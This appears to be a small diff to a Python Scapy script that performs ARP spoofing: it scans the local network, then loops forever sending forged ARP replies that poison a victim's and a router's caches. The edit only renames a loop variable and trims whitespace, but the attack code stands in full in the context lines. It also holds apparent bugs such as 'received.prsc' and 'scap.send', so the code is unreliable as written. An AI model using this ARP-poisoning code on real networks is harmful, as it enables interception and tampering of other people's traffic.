@@ -12,7 +12,7 @@ result = srp(packet, timeout=3, verbose=0)[0]
 ip = []
 mac = []
 
-for sent, received in result:
+for _, received in result:
     ip.append(received.prsc)
     mac.append(received.hwsrc)
 
@@ -30,6 +30,3 @@ while True:
     scap.send(arp_response)
     arp_response = ARP(pdst=router, hwdst=mac[ip.index(router)], psrc=victim)
     scap.send(arp_response)
-        
-
-
